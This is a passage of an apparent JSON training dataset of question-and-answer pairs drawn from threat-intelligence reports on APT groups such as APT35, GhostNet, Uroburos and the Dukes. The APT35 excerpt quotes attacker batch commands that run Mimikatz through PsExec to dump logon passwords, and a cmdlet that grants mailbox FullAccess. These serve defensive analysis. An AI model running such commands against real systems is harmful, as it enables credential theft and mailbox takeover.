consistent with the previous version, but simply has the extra layer of encryption used for the URIs.\n\nQuestion: What changes were made to the encryption algorithm in Sysget v2 compared to the original version, and how does this impact the security of the malware's communication?\n\nAnswer:",
    "output": "In Sysget v2, the encryption algorithm for the configuration file was changed from RC4 to AES-128, using a static key of '734thfg9ih'. This change enhances the security of the malware's communication by utilizing a stronger encryption standard, making it harder for defenders to decrypt and analyze the data without the correct key.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 0. Overview\nThis report is a continuation of the \"Attackers Using FRP (Fast Reverse Proxy) to Attack Korean Companies\" post that was uploaded on August 16, 2022 and follows the group's activities since that post.\nThis group has always relied on open-source tools and lacked any distinct characteristics to profile them due to the lack of PDB information. Additionally, the amount of information that could be collected was limited unless the affected Korean companies specifically asked for an investigation since the threat actor's C2 (Command&Control) server abused the servers of the Korean companies. However, after the post was uploaded and a portion of the Korean company servers used by the threat actor were blocked, the threat actor began to use a hosting server called \"*.m00nlight.top\" as their C2 and download server. Thus, the ASEC team decided to call this group Dalbit (m00nlight.top) after the Korean word for 'Moonlight'.\nThis group has had more than 50 confirmed attack attempts on Korean companies since 2022. Most of the attacked companies were mid to small companies while a portion was major companies. The team has confirmed that 30% of the infected companies were using a certain Korean groupware solution. It is currently difficult to check whether this groupware product has a vulnerability or not, but if a server that is this exposed has a vulnerability, then there is a chance that companies could be affected gravely through the leakage of confidential information and ransomware behavior. Furthermore, this Dalbit group leaves some infected companies as proxies and download servers to later use them as means to communicate with the threat actor upon infiltration of another company.\nTherefore, we strongly recommend performing an internal security check if users suspect that they have been attacked by this Dalbit group. The team asks that users send a report to AhnLab and take preemptive measures to prevent secondary harm and potential damage to other companies.\n\nQuestion: How does the Dalbit (m00nlight.top) group leverage compromised systems within targeted organizations, and what implications does this have for broader cybersecurity strategies?\n\nAnswer:",
    "output": "The Dalbit (m00nlight.top) group leverages compromised systems within targeted organizations by leaving some infected companies as proxies and download servers. This allows the group to use these compromised systems as communication channels with the threat actor upon infiltrating another company. This strategy has significant implications for broader cybersecurity strategies because it highlights the importance of internal security checks and preemptive measures. If a company suspects it has been attacked by the Dalbit group, it is crucial to perform thorough internal security checks and report the incident to AhnLab. This helps prevent secondary harm to the affected organization and potential damage to other companies, as the compromised systems can be used to facilitate further attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What challenges do reverse engineers face when dealing with asymmetric cryptographic algorithms implemented directly in malware? How can these challenges be addressed?",
    "output": "Asymmetric cryptographic algorithms pose significant challenges for reverse engineers because they do not use reliable cryptographic constants and do not involve non-trivial XOR instructions. These algorithms require mathematical functions for calculations with large integers within a finite field. Identifying these functions and the libraries used in their implementation is crucial. However, if the library is unknown or custom, as in the case of Tavdig, the task becomes more difficult. Reverse engineers may need to manually check functions or use a top-down search approach to identify these cryptographic operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: 2011: John Kasai of Klagenfurt, Austria\nDuring 2011, the Dukes appear to have significantly expanded both their arsenal of malware toolsets and their C&C infrastructure. While the Dukes employed both hacked websites and purposely rented servers for their C&C infrastructure, the group rarely registered their own domain names, preferring instead to connect to their self-operated servers via IP addresses.\nThe beginning of 2011 however saw a significant break from that routine, when a large grouping of domain names was registered by the Dukes in two batches; the first batch was registered on the 29th of January and the second on the 13th of February. All the domains in both batches were initially registered with the same alias: \"John Kasai of Klagenfurt, Austria\" (image 2, above). These domains were used by the Dukes in campaigns involving many of their different malware toolsets all the way until 2014. Like the \"MiniDuke loader\", these \"John Kasai\" domains also provide a common thread tying together much of the tools and infrastructure of the Dukes.\n2011: Continuing expansion of the Dukes arsenal\nBy 2011, the Dukes had already developed at least 3 distinct malware toolsets, including a plethora of supporting components such as loaders and persistence modules. In fact, as a sign of their arsenal's breadth, they had already decided to retire one of these malware toolsets as obsolete after developing a replacement for it, seemingly from scratch.\nThe Dukes continued the expansion of their arsenal in 2011 with the addition of two more toolsets: MiniDuke and CozyDuke. While all of the earlier toolsets \u2013 GeminiDuke, PinchDuke, and CosmicDuke \u2013 were designed around a core infostealer component, MiniDuke is centered on a simplistic backdoor component whose purpose is to enable the remote execution of commands on the compromised system. The first observed samples of the MiniDuke backdoor component are from May 2011. This backdoor component however is technically very closely related to GeminiDuke, to the extent that we believe them to share parts of their source code. The origins of MiniDuke can thus be traced back to the origins of\nGeminiDuke, of which the earliest observed sample was compiled in January of 2009.\nUnlike the simplistic MiniDuke toolset, CozyDuke is a highly versatile, modular, malware \"platform\" whose functionality lies not in a single core component but in an array of modules that it may be instructed to download from its C&C server. These modules are used to selectively provide CozyDuke with just the functionality deemed necessary for the mission at hand. CozyDuke's modular platform approach is a clear break from the designs of the previous Duke toolsets.\nThe stylistic differences between CozyDuke and its older siblings are further exemplified by the way it was coded. All of the 4 previously mentioned toolsets were written in a minimalistic style commonly seen with malware; MiniDuke even goes as far as having many components written in Assembly language. CozyDuke however represents the complete opposite. Instead of being written in Assembly or C, it was written in C++ , which provides added layers of abstraction for the developer's perusal, at the cost of added complexity.\nContrary to what might be expected from malware, early CozyDuke versions also lacked any attempt at obfuscating or hiding their true nature. In fact, they were extremely open and verbose about their functionality - for example, early samples contained a plethora of logging messages in unencrypted form. In comparison, even the earliest known GeminiDuke samples encrypted any strings that might have given away the malware's true nature.\nFinally, early CozyDuke versions also featured other elements that one would associate more with a traditional software development project than with malware. For instance, the earliest known CozyDuke version utilized a feature of the Microsoft Visual C++ compiler known as run-time error checking. This feature added automatic error checking to critical parts of the program's execution at the cost, from a malware perspective, of providing additional hints that make the malware's functionality easier for reverse engineers to understand.\nIMAGE 3: MINIDUKE DECOY\nOne of the Ukraine-themed decoy documents used during a MiniDuke campaign in February 2013\nBased on these and other similar stylistic differences observed between CozyDuke and its older siblings, we speculate that while the older Duke families appear to be the work of someone with a background in malware writing (or at the least in hacking), CozyDuke's author or authors more likely came from a software development background.\nMedium Headline: 2012: Hiding in the shadows\nWe still know surprisingly few specifics about the Dukes group's activities during 2012. Based on samples of Duke malware from 2012, the Dukes do appear to have continued actively using and developing all of their tools. Of these, CosmicDuke and MiniDuke appear to have been in more active use, while receiving only minor updates. GeminiDuke and CozyDuke on the other hand appear to have been less used in actual operations, but did undergo much more significant development.\n\nWhy did the Dukes register a large number of domain names in 2011, and how does this relate to their overall strategy?",
    "output": "The Dukes registered a large number of domain names in two batches during 2011, which was a significant departure from their usual practice of connecting to servers via IP addresses. This change indicates an expansion of their command and control (C&C) infrastructure. These domains were used in various campaigns involving multiple malware toolsets until 2014. This strategic move allowed the Dukes to diversify their attack vectors and maintain a broader reach, making it harder for defenders to track and shut down their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Oceansalt Capabilities\nOceansalt is 76KB, a minimal on-disk footprint that is harder to detect than larger malware. The implant has a variety of capabilities for capturing data from the victim's machine using a structured command system. From our research we have determined that this implant is a first-stage component. Further stages are downloaded through its commands. Oceansalt also supports commands enabling the attacker to take various actions on the victim's system.\nBig Headline: Conclusion\nBased on our analysis, the McAfee Advanced Threat Research team has named this global threat Operation Oceansalt. This operation has focused on targets in South Korea and other countries with new malware that has roots in Comment Crew activity from 2010.\nOur research shows that Comment Crew's malware in part lives on in different forms employed by another advanced persistent threat group operating primarily against South Korea. This research represents how threat actors including nation-states might collaborate on their campaigns. McAfee continues to monitor the threat landscape in Asia and around the world to track the evolution of known groups and changes to their techniques.\nBig Headline: About McAfee\nMcAfee is the device-to-cloud cybersecurity company. Inspired by the power of working together, McAfee creates business and consumer solutions that make our world a safer place. By building solutions that work with other companies' products, McAfee helps businesses orchestrate cyber environments that are truly integrated, where protection, detection, and correction of threats happen simultaneously and collaboratively. By protecting consumers across all their devices, McAfee secures their digital lifestyle at home and away. By working with other security players, McAfee is leading the effort to unite against cybercriminals for the benefit of all.\n\nBased on the above text, answer a question. How does the minimal on-disk footprint of Oceansalt contribute to its stealthiness, and what specific capabilities does it possess for capturing data from a victim's machine? Additionally, explain the significance of Oceansalt being identified as a first-stage component.",
    "output": "The minimal on-disk footprint of Oceansalt, which is 76KB, contributes to its stealthiness by making it harder to detect compared to larger malware. This smaller size reduces the likelihood of detection by antivirus software and other security measures. Oceansalt possesses a variety of capabilities for capturing data from the victim's machine using a structured command system. These capabilities allow the attacker to gather sensitive information and perform various actions on the victim's system. The significance of Oceansalt being identified as a first-stage component lies in its role as an initial foothold in the victim's environment. Further stages of the attack are downloaded through its commands, indicating that Oceansalt is part of a multi-stage attack designed to evade detection and persist within the targeted network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Technical complexity suggests connections to intelligence agencies\nThe development of a framework like Uroburos is a huge investment. The development team behind this malware obviously comprises highly skilled computer experts, as you can infer from the structure and the advanced design of the rootkit. We believe that the team behind Uroburos has continued working on even more advanced variants, which are still to be discovered.\nUroburos is designed to work in peer-to-peer mode, meaning that infected machines communicate among each other, commanded by the remote attackers. By commanding one infected machine that has Internet connection, the malware is able to infect further machines within the network, even the ones without Internet connection. It can spy on each and every infected machine and manages to send the exfiltrated information back to the attackers, by relaying this exfiltrated data through infected machines to one machine with Internet connection. This malware behavior is typical for propagation in networks of huge companies or public authorities. The attackers expect that their target does have computers cut off from the Internet and uses this technique as a kind of workaround to achieve their goal.\nUroburos supports 32-bit and 64-bit Microsoft Windows systems. Due to the complexity of this malware and the supposed spying techniques used by it, we assume that this rootkit targets governments, research institutes, or/and big companies.\nMedium Headline: Relation to Russian attack against U.S. suspected\nDue to many technical details (file name, encryption keys, behavior and more details mentioned in this report), we assume that the group behind Uroburos is the same group that performed a cyberattack against the United States of America in 2008 with a malware called Agent.BTZ. Uroburos checks for the presence of Agent.BTZ and remains inactive if it is installed. It appears that the authors of Uroburos speak Russian (the language appears in a sample), which corroborates the relation to Agent.BTZ. Furthermore, according to public newspaper articles, this fact, the usage of Russian, also applied for the authors of Agent.BTZ.\nAccording to all indications we gathered from the malware analyses and the research, we are sure of the fact that attacks carried out with Uroburos are not targeting John Doe but high profile enterprises, nation states, intelligence agencies and similar targets.\nMedium Headline: Uroburos' name\nUroburos is a direct reference to the Greek word Ouroboros (\u039f\u1f50\u03c1\u03bf\u03b2\u03cc\u03c1\u03bf\u03c2). The Ouroboros is an ancient symbol depicting a serpent or dragon eating its own tail. The name of this rootkit is inspired by a plain text string available in several driver files: Ur0bUr()sGotyOu#\nFurthermore, we identified other references to the ancient serpent/dragon symbol within the rootkit's code, for example the following strings:\n\uf0b1 inj_snake_Win32.dll\n\uf0b1 inj_snake_Win64.dll\n\uf0b1 snake_alloc\n\uf0b1 snake_free\n\uf0b1 snake_modules_command\nAnother interesting notion: The exact spelling, Uroburos, can even be found in a webcomic called Homestuck. In this interactive webcomic, the reader/player needs two codes to receive virtual magic objects (called juju). Those two codes are in fact uROBuROS and UrobUros.  We can notice that the uppercase and lowercase character order matches the string found within the malware code.\nMedium Headline: Rootkit framework\nThe rootkit is basically composed of two files:\n\uf0b1 a driver (.sys file);\n\uf0b1 a virtual file system (.dat file).\nWe identified several file names for the driver, for example: Ultra3.sys, msw32.sys, vstor32.sys. We have encountered 32-bit and 64-bit driver versions. The two binaries may be installed simultaneously on one system.\nThe file containing the virtual file system has a random name, followed by the extension .dat. Furthermore, this file is located in the same directory as the driver file. The installation directory does change, but we were able to identify the following pattern:\n\uf0b1 %SYSTEMROOT%\\$Ntuninstall[Random_ID]$\nThe malware's persistence is established by the creation of a service which automatically executes during each startup of the system. The service is located in\n\uf0b1 HKLM\\System\\CurrentControlSet\\Services\\Ultra3\nThe driver is needed to\n\uf0b1 decrypt the virtual file systems\n\uf0b1 create several hooks to hide its activities\n\uf0b1 inject libraries in the users land\n\uf0b1 establish and manage some communication channels\nMedium Headline: Hiding malicious activities with the help of hooks\nA rootkit naturally tries to hide its activities from the user and so does Uroburos. The driver uses inline patching to perform the hooks, which is a common way to perform this task. Inline patching is carried out by modifying the beginning of a targeted system's function in order to redirect the execution flow to a custom code before jumping back to the original function.\nIn the current case, the inline patching adds a new interrupt instruction (int 0xc3) at the beginning of the hooked function. Doing this, the malware adds malicious behavior to legitimate functions.\nThe main hooked functions are:\n\uf0b1 ZwQueryKey(), ZwEnumerateKey(), ZwCreateKey() and ZwSaveKey() their purpose is to hide the persistence keys in the registry\n\uf0b1 ZwReadFile() its purpose is to hide the driver and file system files\n\uf0b1 ZwQuerySystemInformation() its purpose is to hide rootkit handles\n\uf0b1 ZwTerminateProcess() its purpose is to terminate cleanly the rootkit during the shutdown of the operating system\n\uf0b1 ObOpenObjectByName() its purpose is to hide the rootkit's virtual file systems\nMedium Headline: Virtual file systems\nThe Uroburos rootkit uses two virtual file systems \u2013 one NTFS file system and one FAT file system. They are stored locally, on the infected machine. This means that the victim's computer contains an encrypted file, which, in reality, hosts another file system.\nThe virtual file systems are used as a work space by the attackers. They can store third party tools, post-exploitation tools, temporary files and binary output. The virtual file systems can be accessed through the devices \\Device\\RawDisk1 and \\Device\\RawDisk2 and the volume \\\\.\\Hd1 and \\\\.\\Hd2.\nMedium Headline: The NTFS file system\nThe encryption used for the file systems is CAST-1281(<>). The respective encryption key is hardcoded within the driver file. Once decrypted, the virtual file system is a classic NTFS volume, which can be simply accessed through the standard Microsoft file system APIs. During our analysis, we identified several files the file systems contained:\n\uf0b1 .bat scripts used by the attackers\n\uf0b1 .log files with the output of the execution of the .bat files\n\uf0b1 third party tools\n\uf0b1 queue files\nThe .bat scripts contain some net use commands to map a remote file server, netstat commands to have network information, system info commands to get a complete view of the system configuration.\n1 http://en.wikipedia.org/wiki/CAST-128\nThe queue file is the most interesting and complex part of the virtual file system. Each message in the queue contains a unique ID, a type, a timestamp and content. The content is also encrypted using the CAST-128 algorithm and the respective key is stored in a message, too. The messages can contain the following information:\n\uf0b1 a key to decrypt other messages\n\uf0b1 a configuration\n\uf0b1 a file (or library injected in user land)\n\uf0b1\u2026\nMedium Headline: Third party tools\nWe found classic post-exploitation tools, used by a lot of different APT actors. The following list provides an overview of the tools found in the virtual file system:\n\uf0b1 Dumper for NTLM (hash of a user's password). This information can be used to perform \"pass the hash\"2 (<>)attacks, to compromise new systems within the infrastructure\n\uf0b1 information gathering tools, to get information on the infected system\n\uf0b1 RAR tools, to create archives of stolen documents\n\uf0b1 Microsoft Office document stealer\n\uf0b1\u2026\n2 http://en.wikipedia.org/wiki/Pass_the_hash\n\nQuestion: How does Uroburos utilize inline patching to hide its activities, and what specific functions does it hook to achieve this?\n\nAnswer:",
    "output": "Uroburos uses inline patching to hide its activities by modifying the beginning of targeted system functions to redirect the execution flow to custom code before returning to the original function. This is done by adding a new interrupt instruction (int 0xc3) at the start of the hooked function. The main functions hooked by Uroburos include ZwQueryKey(), ZwEnumerateKey(), ZwCreateKey(), ZwSaveKey(), ZwReadFile(), ZwQuerySystemInformation(), ZwTerminateProcess(), and ObOpenObjectByName(). These hooks serve various purposes, such as hiding persistence keys in the registry, concealing the driver and file system files, hiding rootkit handles, ensuring clean termination during shutdown, and hiding the rootkit's virtual file systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CASE STUDY: APT35\nIn early 2017, Mandiant responded to an incident involving APT35 targeting an energy company. The attacker used a spear-phishing email containing a link to a fake resume hosted on a legitimate website that had been compromised. The resume contained the PUPYRAT backdoor, which communicated with known APT35 infrastructure. APT35 also installed BROKEYOLK, a custom backdoor, to maintain persistence on the compromised host. They then proceeded to log directly into the VPN using the credentials of the compromised user.\nOnce connected to the VPN, APT35 focused on stealing domain credentials from a Microsoft Active Directory Domain Controller to allow them to authenticate to the single-factor VPN and Office 365 instance. The attacker did not deploy additional backdoors to the environment.\nDuring the analysis of a compromised domain controller, Mandiant identified batch files (Fig. 4) that were used to steal credentials and hide attacker activity by performing the following actions:\n1. Copied a modified variant of Mimikatz to the remote system.\n2. Executed Microsoft's Sysinternal's PsExec utility to deploy and execute a Windows batch file containing commands to execute the Mimikatz variant on each target system.\n3. Copied the contents of the Mimikatz output to a local file, named after the remote system.\n4. Deleted the modified variant of Mimikatz from the remote system.\nFigure 4. Contents of recovered batch files.\nContents of \"run.bat\"\ncopy MsMpEng.exe \\\\%1\\C$\\windows\\temp\\MsMpEng.exe\nPsExec.exe \\\\%1 -s -c m.bat -accepteula move  \\\\%1\\C$\\Windows\\temp\\temp.dat %1.txt del \\\\%1\\C$\\windows\\temp\\MsMpEng.exe\nContents of \"m.bat\"\nC:\\windows\\MsMpEng.exe privilege::debug sekurlsa::logonPasswords exit > C:\\windows\\temp\\temp.dat\nWhile the credential harvesting technique was unsophisticated, it was effective. Mandiant's analysis indicated the attacker successfully harvested credentials from more than 500 systems within the environment using this technique.\nWhile having access to the organization's environment, the attacker targeted data related to entities in the Middle East. Mandiant has previously observed targeted attackers stealing email, but few threat actors have been as successful at this as APT35. Additionally, the attacker's methodology for accessing and stealing email from a victim organization adapted to accommodate cloud migration trends as companies moved to off-premises email solutions such as Office 365.\nForensic analysis revealed the attacker leveraged Microsoft Exchange Client Access cmdlets to modify permissions on target mailboxes. Exchange has several Client Access cmdlets that are used legitimately by Exchange administrators for routine tasks and maintenance.\nMandiant observed that the attacker had granted compromised accounts read access to hundreds of mailboxes with the \"Add-MailboxPermission\" cmdlet (Fig. 5).\nFollowing the assignment of mailbox permissions, the attacker authenticated to the victim organization's Outlook Web Access (OWA) portal to access targeted inboxes. By assigning these permissions to a single account, the attacker was able to read, access and steal hundreds of emails in a single view. The attacker could also blend into normal day-to-day activities of users accessing their email through the OWA portal, and did not need to install any additional malware into the environment. Ultimately, APT35 had used access to hundreds of mailboxes to read email communications and steal data related to Middle East organizations, which later became victims of destructive attacks.\nA cmdlet is a lightweight Windows PowerShell command.\nFigure 5. Example of attacker adding \"read\" access to target mailbox.\n2018-01-01 01:02:34 EXCHANGESERVER 7872 w3wp#MSExchangePowerShellFrontEndAppPool 68   COMPROMISED_ ACCOUNT  TRUE ManagementShell Add-MailboxPermission -User <AttackerControlledAccount> -AccessRights (\"FullAccess\") -InheritanceType \"All\"\nBig Headline: HIDDEN THREATS REMAIN IN LEGACY SYSTEMS A case study from Asia Pacific\nOrganizations continue to struggle with tracking and maintaining their internet footprint.  This case study from Asia Pacific illustrates the continuation of a well-established trend of exposure and compromise of poorly protected and overlooked legacy systems.\nA large company in Asia was recently the latest in a long line of organizations to be compromised because Remote Desktop Protocol (RDP) is accessible from the Internet.\nAt some point during the compromise the client's antivirus software began detecting some of the attacker's password dumping tools, so the attacker added the \"C:\\temp\\\" directory, which was being used as a tool repository, to the list of directories to not be scanned by antivirus software. Configuring the antivirus software to ignore the directory \"C:\\temp\" created a registry artifact (Fig. 6) that helped identify additional systems compromised by the attacker.\nThis case illustrates the risk posed by having the RDP accessible from the Internet. Access to RDP is a common vector used by attackers to gain access to environments either directly from the Internet or by leveraging access they gain through a third-party.\nInitial compromise: Mandiant identified evidence of malicious activity dating back several years, and that the environment had been accessed by more than one attacker. Mandiant was unable to identify how the environment was first compromised due to evidence decay.\nEstablish foothold: The attacker moved laterally within the environment and installed a variety of backdoors, keyloggers and network traffic tunnelers, ranging from publicly available malware such as Gh0stRAT, Empire, and the China Chopper web shell, to some highly powerful and non-public malware.\nEscalate privileges: The attacker leveraged credentials obtained from domain controllers and keyloggers installed on the systems of high-value individuals to provide access to the environment.\nInternal reconnaissance: The attacker conducted internal reconnaissance using built-in tools and tools that the attacker placed in the environment.  Examples of the methods used for internal reconnaissance included:\n\u2022 PowerShell\n\u2022 Windows Task Scheduler\n\u2022 NBTScan\n\u2022 TCPScan\n\u2022 Non-public keyloggers\n\u2022 Non-public screen recorders\nComplete mission: The attacker targeted billing and customer information. Mandiant identified evidence suggesting gigabytes of sensitive customer information had been exfiltrated from the network.\nFigure 6: Example of the registry artifact that was created by the attacker adding an exclusion for the directory \"C:\\temp\".\nRedacted Eventlog Messages of Whitelisting a Folder\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Popular AV Program\\AV\\Exclusions\\HeuristicScanning\\Directory\\Client\\3212312312\\ DirectoryName | C:\\temp\\\nMedium Headline: ONCE A TARGET, Always a Target\nA significant attack is attacker activity that may include data theft, compromised accounts, credential harvesting, lateral movement and spear phishing, which affects at least 43% of our managed detection and response customers.\nIn 2013 M-Trends, we looked at organizations that had been targeted or re-compromised after remediating a previous attack. Our original data showed 38 percent of clients were attacked after remediation. Our 2017 data shows that, 56 percent of FireEye managed detection and response customers who were previously Mandiant incident response clients were targets of at least one significant attack in the past 19 months by the same or similarly motivated attack group.\nWe also found that: 49%\nof customers with at least one significant attack were successfully attacked again within one year.\nVery Small Headline: Regional Considerations\nWe find that customers in the APAC region are twice as likely to have experienced multiple incidents from multiple attackers, compared to customers in EMEA or North America. Over 91 percent of our APAC customers with at least one significant attack will have attacker activity within the next year (Fig. 7). Of those customers, 82 percent will have multiple attackers identified over the life of their service (Fig. 8).\nFigure 7. Customers with one significant attack that experienced another attack of consequence, by region.\nVery Small Headline: Industry Trends\nThe top three industries most frequently targeted by multiple attackers are high-tech, telecommunications and education (Fig. 9).\nThe top three industries with the most significant attacks are financial, high-tech and healthcare (Fig. 10).\nThere is a difference between industries that have been successfully attacked by multiple threat groups versus industries that are targeted most often. Notably, the high-tech industry is both frequently targeted by multiple attackers and also sees a large number of significant attack attempts (Fig. 11).\nThis trend highlights the industries that most often have to deal with multiple types of threat actors, each with potentially different missions and TTPs to defend against.\n\u2022 Several industries appear more adaptive and more rigorous in their security posture over time. As an example, when we examine the industries that suffer multiple successful attacks, separated by remediation attempts, we observed that the financial industry was ninth out of 16 industries. Our experiences suggest the financial services are less likely to succumb to subsequent attacks over time.\n\u2022 Industries that have historically been targeted by Chinese based groups move to the top of the \"attacked by multiple groups\" list.\nUnfortunately, if you've been breached, our statistics show that you are much more likely to be attacked and suffer another breach. If you have not taken steps to enhance your security posture, you are taking a significant risk.\nQuestion: How did APT35 leverage Microsoft Exchange Client Access cmdlets to facilitate their data exfiltration efforts?",
    "output": "Answer: APT35 utilized Microsoft Exchange Client Access cmdlets to modify permissions on target mailboxes. Specifically, they used the 'Add-MailboxPermission' cmdlet to grant compromised accounts read access to hundreds of mailboxes. This allowed the attacker to read, access, and steal emails from multiple mailboxes without needing to install additional malware, blending into normal user activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Sending commands\nThe Send Command link provided for each entry yields an interface that allows an attacker(s) to send specific commands to the selected infected computer. In addition to a custom command, the attacker(s) may choose from a menu of commands, which includes options to download binaries that provide additional functionality (such as keystroke logging or remote administration), acquire system information (list computer information, software and documents on the computer), or cause the malware to become dormant. (See Fig. 9 - p. 35)\nUsing the Send Command interface, the attacker(s) issues instructions to the infected computers to download malicious files that are disguised as standard image files. As mentioned above, the files are most often hosted on additional command servers that appear to be dedicated to hosting these infected files.46 These command servers contain a variety of files. While the exact function of each file is not known, the file names given to them by the attacker(s) provide some indication of their functionality. There are file names associated with the retrieval of files as well as keystroke logging.\nOne of the commands available to the attacker(s) instructs infected computers to download the gh0st RAT remote administration tool, which gives the attacker(s) full, real-time control of the infected computer. Gh0st RAT is an open source Trojan that is widely available online. It was developed by Chinese programmers but has now been translated into English. The program allows an attacker to create an executable file that can be repacked and disguised and used to infect and compromise a target computer. This file can be configured to directly connect to the gh0st RAT owner or to a third location, a control server, when it retrieves the current IP address of the gh0st RAT owner. (See Fig. 10 - p. 36)\nOnce the infected computer connects to the gh0st RAT owner, an entry appears in the Connection window with some information about the infected computer. The gh0st RAT owner may then issue commands to the infected computer. These commands include file manager, screen capture, keylogger, remote shell, system, webcam view, audio capture, as well as the ability to force the infected host to download and execute additional malware, such as a gh0st RAT update.\nDuring the course of the investigation, we infected a honey pot computer with the attacker(s)' malware. We instructed our infected computer to download the attacker(s)' version of gh0st RAT using the malicious network's web-based administration interface. The gh0st RAT attempted to connect to several *.broad.hk.hi.dynamic.163data.com.cn IP addresses before finally successfully connecting to xxxxxxxxxxxxxxxxxxxxxxxxx.broad.hk.hi.dynamic.163data.com.cn).\n46 In some cases the malicious image files are hosted on the control servers themselves.\nFig. 9\nThe GhostNet \"Send Command\" interface.\nThis screen capture of the GhostNet interface shows how the attacker(s) can send specific commands to infected computers. It has been obscured to protect the identity of the victims.\nFig. 10\nThe gh0st RAT interface.\nThis screen capture of the English language version of the gh0st RAT software shows the commands that an attacker is able to execute on the compromised computer.\nThe gh0st RAT tool attempts to connect to IP addresses of a DSL provider in Hainan, China:\n\u2022 xxxxxxxxxxxx.broad.hk.hi.dynamic.163data.com.cn\n\u2022 xxxxxxxxxxxx.broad.hk.hi.dynamic.163data.com.cn\n\u2022 xxxxxxxxxxxx.broad.hk.hi.dynamic.163data.com.cn\n\u2022 xxxxxxxxxxxx.broad.hk.hi.dynamic.163data.com.cn\n\u2022 xxxxxxxxxxxx.broad.hk.hi.dynamic.163data.com.cn\n\u2022 xxxxxxxxxxxx.broad.hk.hi.dynamic.163data.com.cn\nAfter a successful connection, the attacker(s) proceed to issue commands on our infected computer in real-time.\nWe found similar but unsuccessful connections to the same IP address range from some of the infected computers we analysed and discovered that a rudimentary version of the web-based administration interface contained only one infection from the same IP address range in Hainan. In addition, one of the servers used to host the attacker(s)' malicious files is a Government of Hainan web server located in Hainan, and one of the control server interfaces we gained access to is also located in Hainan. However, one should not rush to judgement concerning the identity of the attacker(s) based on this location. The gh0st RAT software can be configured with a proxy server; therefore it is possible that the attacker(s) were using a compromised system as a proxy to hide their true location.\nSmall Headline: Command results\nThe Command Result page lists the commands issued through the Send Command page and the status of those commands. Each entry in this interface shows what command was sent to the infected computer, including the URL to the command server and the command file (the malicious file disguised as an image). Upon the successful completion of a command, the relevant date, time, and result are recorded. (See Fig. 11 - p. 38)\nThe Command Result page contains a column that displays the content sent back to the control server from the infected computer. The command issued to retrieve this content in the Send Command interface is labelled \"Acquire System Information.\" Even though we have been unable to properly decode the content,47 the plain text values in the binary content indicate that these entries contain information about the infected computer (CPU, memory, operating system, programmes installed) as well as file names of documents on the computer, presumably for later retrieval. This information is likely used to determine which targets the attacker(s) will further exploit and control using remote administration tools such as gh0st RAT.\n47 The content is base64 encoded and XORed with values we have yet to identify.\nFig. 11\nThe GhostNet \"List Command\" interface.\nThis screen capture of the GhostNet interface lists the commands issued to infected computers. It has been obscured to protect the identity of the victims.\nSmall Headline: Methods and capabilities\nThe attacker(s) are able to exploit several infection vectors. First, they create web pages that contain \"drive by\" exploit code that infects the computers of those who visit the page. Second, the attacker(s) have also shown that they engage in spear phishing in which contextually relevant emails are sent to targets with PDF and DOC attachments which, when executed, create back doors that cause the infected computer to connect to a control server and await further instructions.\nWith each successful infection the attacker(s) may use any contextually relevant data to further exploit the targeted community and may also impersonate the initial target in order to infect all the targets' contacts. Finally, the targets themselves may infect others by forwarding infected documents to their contacts. In this way, the network of infected computers grows organically.\nThe first stage of infection focuses on getting targets to execute malicious code. Once infected, the target's computer routinely checks in with a control server in order to receive further instructions. At this stage, the attacker(s) acquires some initial information regarding the identity of the infected computer.\nNewer versions of the administration interface contain a direct link to a web service that looks up the relevant WHOIS information about the IP address of the infected computer along with a simple port scan. This version also does a geoIP lookup on the infected computer's IP address and lists the country in which the computer is located, indicating that the attacker(s) has an interest in the geographical location of the infected computers.\nThe attack may also issue an acquire system information command that causes the infected computer to upload its hardware statistics, list of programs installed, list of recent documents, and current network connections. The attacker(s) may use this information to target the infected computer for further exploitation.\nThe attacker(s) directs the infected computers to download and install a remote administration Trojan. The attacker(s) have demonstrated a preference for gh0st RAT but may choose from a variety of Trojans. The attacker(s) simply browses to the \"send command\" interface and pastes in a link to a version of gh0st RAT on a \"command\" server under his or her control. The next time the infected computer checks in to the control server, it will be instructed to download and execute gh0st RAT. Upon completion, the infected computer notifies the control server and the result appears in the attacker(s)' web interface.\nOnce gh0st RAT is installed on the target, the infected computer will periodically check a specific location and retrieve the IP address to which it is supposed to connect. When the attacker(s) is not available, he or she will often change this IP to 127.0.0.1 (localhost) so that the amount of potentially suspicious external traffic is limited. When the attacker(s) is ready to receive connections, the IP address is changed to a valid external IP address.\nWhen the attacker(s) turns on gh0st RAT, he or she is able to see all the infected machines that have established connections to him or her. The attacker(s) may then execute a wide variety of commands, including file manager, screen capture, keylogger, remote shell, system, webcam view, audio capture, as well as the ability to force the infected host to download and execute additional malware, such as a gh0st RAT update. The attacker(s) may also secretly execute programs on the target computer.\nRead the text above and answer this question: Explain the process by which the GhostNet attacker uses the gh0st RAT tool to gain control over an infected computer. What steps are involved in establishing a connection and issuing commands?",
    "output": "The GhostNet attacker uses the gh0st RAT tool to gain control over an infected computer by instructing the infected computer to download the gh0st RAT executable via the 'Send Command' interface. The gh0st RAT tool then attempts to connect to several IP addresses, typically associated with a DSL provider in Hainan, China. Once a successful connection is established, an entry appears in the Connection window with information about the infected computer. The attacker can then issue commands such as file management, screen capture, keylogging, remote shell access, system information retrieval, webcam viewing, audio capture, and the ability to force the infected host to download and execute additional malware. During the investigation, the infected computer connected to an IP address in Hainan, but it is important to note that the gh0st RAT software can be configured with a proxy server, potentially hiding the true location of the attacker.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the MONSOON APT campaign utilize CVE-2014-6352 in its attacks, and what are the implications of this vulnerability on the campaign's overall impact?",
